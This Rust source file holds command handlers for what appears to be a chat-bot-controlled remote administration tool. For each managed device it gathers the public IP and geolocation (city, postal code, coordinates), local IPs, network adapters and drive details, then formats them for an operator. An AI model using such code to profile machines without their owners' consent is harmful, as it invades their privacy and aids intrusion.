use std::process::Command;
use std::os::windows::ffi::OsStrExt;
use std::ffi::OsStr;
use anyhow::{Result, Context};
use serde_json::Value;

use crate::device_manager::DeviceManager;
use crate::config::IP_INFO_URL;

/// Выполняет команду /info - получает информацию об устройстве
pub async fn handle_info_command(device_manager: &DeviceManager, device_id: &str) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Ok(format!("❌ Устройство с ID `{}` не найдено", device_id));
    }

    if let Some(device) = device_manager.get_current_device() {
        device_manager.update_device_activity(device_id);
        Ok(device.format_info())
    } else {
        Ok("❌ Не удалось получить информацию об устройстве".to_string())
    }
}

/// Выполняет команду /ipinfo - получает подробную информацию об IP и местоположении
pub async fn handle_ipinfo_command(device_manager: &DeviceManager, device_id: &str) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Ok(format!("❌ Устройство с ID `{}` не найдено", device_id));
    }

    device_manager.update_device_activity(device_id);

    // Получаем подробную информацию об IP
    match get_detailed_ip_info().await {
        Ok(info) => Ok(format_ip_info(&info)),
        Err(e) => Ok(format!("❌ Ошибка получения IP информации: {}", e))
    }
}

/// Выполняет команду /devices - показывает список всех устройств
pub async fn handle_devices_command(device_manager: &DeviceManager) -> Result<String> {
    let devices_list = device_manager.format_devices_list();
    Ok(devices_list)
}

/// Выполняет команду /listdrives - получает список дисков
pub async fn handle_listdrives_command(device_manager: &DeviceManager, device_id: &str) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Ok(format!("❌ Устройство с ID `{}` не найдено", device_id));
    }

    device_manager.update_device_activity(device_id);

    match get_drives_list() {
        Ok(drives) => Ok(format_drives_list(&drives)),
        Err(e) => Ok(format!("❌ Ошибка получения списка дисков: {}", e))
    }
}

/// Получает подробную информацию об IP адресе
async fn get_detailed_ip_info() -> Result<Value> {
    let client = reqwest::Client::new();
    
    // Пытаемся получить информацию с основного API
    match client.get(IP_INFO_URL).send().await {
        Ok(response) => {
            if response.status().is_success() {
                let json: Value = response.json().await
                    .context("Failed to parse IP info JSON")?;
                return Ok(json);
            }
        }
        Err(_) => {}
    }

    // Если основной API недоступен, пытаемся альтернативные
    let backup_urls = [
        "https://ipapi.co/json/",
        "https://httpbin.org/ip",
        "https://api.ipify.org?format=json"
    ];

    for url in &backup_urls {
        if let Ok(response) = client.get(*url).send().await {
            if response.status().is_success() {
                if let Ok(json) = response.json::<Value>().await {
                    return Ok(json);
                }
            }
        }
    }

    Err(anyhow::anyhow!("Не удалось получить информацию об IP"))
}

/// Форматирует информацию об IP для отправки
fn format_ip_info(info: &Value) -> String {
    let mut result = String::from("🌐 **IP Информация:**\n\n");

    // Основная информация
    if let Some(ip) = info.get("ip").and_then(|v| v.as_str()) {
        result.push_str(&format!("📍 **IP адрес:** `{}`\n", ip));
    }

    // Информация о местоположении
    if let Some(country) = info.get("country_name").and_then(|v| v.as_str()) {
        result.push_str(&format!("🏴 **Страна:** {}\n", country));
    }

    if let Some(region) = info.get("region").and_then(|v| v.as_str()) {
        result.push_str(&format!("🗺️ **Регион:** {}\n", region));
    }

    if let Some(city) = info.get("city").and_then(|v| v.as_str()) {
        result.push_str(&format!("🏙️ **Город:** {}\n", city));
    }

    if let Some(postal) = info.get("postal").and_then(|v| v.as_str()) {
        result.push_str(&format!("📮 **Почтовый код:** {}\n", postal));
    }

    // Координаты
    if let (Some(lat), Some(lon)) = (
        info.get("latitude").and_then(|v| v.as_f64()),
        info.get("longitude").and_then(|v| v.as_f64())
    ) {
        result.push_str(&format!("🗺️ **Координаты:** {:.4}, {:.4}\n", lat, lon));
    }

    // Информация о провайдере
    if let Some(isp) = info.get("org").and_then(|v| v.as_str()) {
        result.push_str(&format!("🌐 **Провайдер:** {}\n", isp));
    }

    // Часовой пояс
    if let Some(timezone) = info.get("timezone").and_then(|v| v.as_str()) {
        result.push_str(&format!("🕐 **Часовой пояс:** {}\n", timezone));
    }

    // Дополнительная техническая информация
    result.push_str("\n**Техническая информация:**\n");
    
    // Локальные IP адреса
    if let Ok(local_ips) = get_local_ip_addresses() {
        result.push_str(&format!("🏠 **Локальные IP:** {}\n", local_ips.join(", ")));
    }

    // Информация о сетевых адаптерах
    if let Ok(adapters) = get_network_adapters() {
        result.push_str(&format!("🔌 **Сетевые адаптеры:** {}\n", adapters.join(", ")));
    }

    result
}

/// Получает список дисков
fn get_drives_list() -> Result<Vec<DriveInfo>> {
    let mut drives = Vec::new();

    // Используем Windows API для получения списка дисков
    #[cfg(windows)]
    {
        use windows::Win32::Storage::FileSystem::{GetLogicalDrives, GetDriveTypeW, GetVolumeInformationW};
        use windows::Win32::Foundation::MAX_PATH;

        unsafe {
            let drive_mask = GetLogicalDrives();
            
            for i in 0..26 {
                if (drive_mask & (1 << i)) != 0 {
                    let drive_letter = char::from(b'A' + i as u8);
                    let drive_path = format!("{}:\\", drive_letter);
                    
                    let drive_path_wide: Vec<u16> = OsStr::new(&drive_path)
                        .encode_wide()
                        .chain(std::iter::once(0))
                        .collect();

                    let drive_type = GetDriveTypeW(windows::core::PCWSTR::from_raw(drive_path_wide.as_ptr()));
                    
                    let drive_type_str = match drive_type {
                        2 => "Съемный диск",
                        3 => "Жесткий диск",
                        4 => "Сетевой диск",
                        5 => "CD/DVD",
                        6 => "RAM диск",
                        _ => "Неизвестно",
                    };

                    // Получаем информацию о объеме
                    let mut volume_name = vec![0u16; MAX_PATH as usize];
                    let mut file_system = vec![0u16; MAX_PATH as usize];
                    let mut serial_number = 0u32;
                    let mut max_component_length = 0u32;
                    let mut file_system_flags = 0u32;

                    let volume_info_result = GetVolumeInformationW(
                        windows::core::PCWSTR::from_raw(drive_path_wide.as_ptr()),
                        Some(&mut volume_name),
                        Some(&mut serial_number),
                        Some(&mut max_component_length),
                        Some(&mut file_system_flags),
                        Some(&mut file_system),
                    );

                    let volume_label = if volume_info_result.is_ok() {
                        String::from_utf16_lossy(&volume_name).trim_end_matches('\0').to_string()
                    } else {
                        "Нет метки".to_string()
                    };

                    let file_system_name = if volume_info_result.is_ok() {
                        String::from_utf16_lossy(&file_system).trim_end_matches('\0').to_string()
                    } else {
                        "Неизвестно".to_string()
                    };

                    // Получаем информацию о свободном месте
                    let space_info = get_disk_space(&drive_path);

                    drives.push(DriveInfo {
                        letter: drive_letter,
                        path: drive_path,
                        drive_type: drive_type_str.to_string(),
                        label: volume_label,
                        file_system: file_system_name,
                        total_space: space_info.0,
                        free_space: space_info.1,
                    });
                }
            }
        }
    }

    // Альтернативный метод через команду wmic
    #[cfg(not(windows))]
    {
        let output = Command::new("wmic")
            .args(&["logicaldisk", "get", "size,freespace,caption,volumename,filesystem", "/format:csv"])
            .output()
            .context("Failed to execute wmic command")?;

        let output_str = String::from_utf8_lossy(&output.stdout);
        for line in output_str.lines().skip(1) {
            let parts: Vec<&str> = line.split(',').collect();
            if parts.len() >= 6 {
                drives.push(DriveInfo {
                    letter: parts[1].chars().next().unwrap_or('?'),
                    path: parts[1].to_string(),
                    drive_type: "Диск".to_string(),
                    label: parts[5].to_string(),
                    file_system: parts[2].to_string(),
                    total_space: parts[4].parse().unwrap_or(0),
                    free_space: parts[3].parse().unwrap_or(0),
                });
            }
        }
    }

    Ok(drives)
}

/// Структура информации о диске
#[derive(Debug)]
struct DriveInfo {
    letter: char,
    path: String,
    drive_type: String,
    label: String,
    file_system: String,
    total_space: u64,
    free_space: u64,
}

/// Форматирует список дисков для отправки
fn format_drives_list(drives: &[DriveInfo]) -> String {
    let mut result = String::from("💾 **Список дисков:**\n\n");

    for drive in drives {
        let used_space = drive.total_space.saturating_sub(drive.free_space);
        let usage_percent = if drive.total_space > 0 {
            (used_space as f64 / drive.total_space as f64 * 100.0) as u32
        } else {
            0
        };

        let progress_bar = create_progress_bar(usage_percent);

        result.push_str(&format!(
            "💿 **{}:** `{}`\n\
            └ 🏷️ {}\n\
            └ 📁 {} | 💾 {}\n\
            └ 📊 {} ({}/{})\n\
            └ {}\n\n",
            drive.letter,
            drive.path,
            if drive.label.is_empty() { "Без метки" } else { &drive.label },
            drive.drive_type,
            drive.file_system,
            format!("{}%", usage_percent),
            format_bytes(used_space),
            format_bytes(drive.total_space),
            progress_bar
        ));
    }

    if drives.is_empty() {
        result.push_str("❌ Диски не найдены");
    }

    result
}

/// Получает информацию о дисковом пространстве
fn get_disk_space(path: &str) -> (u64, u64) {
    #[cfg(windows)]
    {
        use windows::Win32::Storage::FileSystem::GetDiskFreeSpaceExW;

        let path_wide: Vec<u16> = OsStr::new(path)
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        unsafe {
            let mut free_bytes = 0u64;
            let mut total_bytes = 0u64;
            
            let result = GetDiskFreeSpaceExW(
                windows::core::PCWSTR::from_raw(path_wide.as_ptr()),
                Some(&mut free_bytes),
                Some(&mut total_bytes),
                None,
            );

            if result.is_ok() {
                return (total_bytes, free_bytes);
            }
        }
    }

    (0, 0)
}

/// Получает список локальных IP адресов
fn get_local_ip_addresses() -> Result<Vec<String>> {
    let output = Command::new("ipconfig")
        .output()
        .context("Failed to execute ipconfig")?;

    let output_str = String::from_utf8_lossy(&output.stdout);
    let mut ips = Vec::new();

    for line in output_str.lines() {
        if line.trim().starts_with("IPv4") && line.contains(':') {
            if let Some(ip) = line.split(':').nth(1) {
                let ip = ip.trim();
                if !ip.starts_with("127.") && !ip.starts_with("169.254.") {
                    ips.push(ip.to_string());
                }
            }
        }
    }

    Ok(ips)
}

/// Получает список сетевых адаптеров
fn get_network_adapters() -> Result<Vec<String>> {
    let output = Command::new("wmic")
        .args(&["path", "win32_networkadapter", "where", "netconnectionstatus=2", "get", "name", "/value"])
        .output()
        .context("Failed to execute wmic")?;

    let output_str = String::from_utf8_lossy(&output.stdout);
    let mut adapters = Vec::new();

    for line in output_str.lines() {
        if line.starts_with("Name=") {
            let name = line.replace("Name=", "").trim().to_string();
            if !name.is_empty() {
                adapters.push(name);
            }
        }
    }

    Ok(adapters)
}

/// Форматирует размер в байтах в читаемый формат
fn format_bytes(bytes: u64) -> String {
    const UNITS: &[&str] = &["B", "KB", "MB", "GB", "TB"];
    
    if bytes == 0 {
        return "0 B".to_string();
    }

    let mut size = bytes as f64;
    let mut unit_index = 0;

    while size >= 1024.0 && unit_index < UNITS.len() - 1 {
        size /= 1024.0;
        unit_index += 1;
    }

    format!("{:.1} {}", size, UNITS[unit_index])
}

/// Создает прогресс-бар для отображения использования диска
fn create_progress_bar(percent: u32) -> String {
    const BAR_WIDTH: usize = 20;
    let filled = (percent as usize * BAR_WIDTH) / 100;
    let empty = BAR_WIDTH - filled;

    format!("[{}{}]", "█".repeat(filled), "░".repeat(empty))
}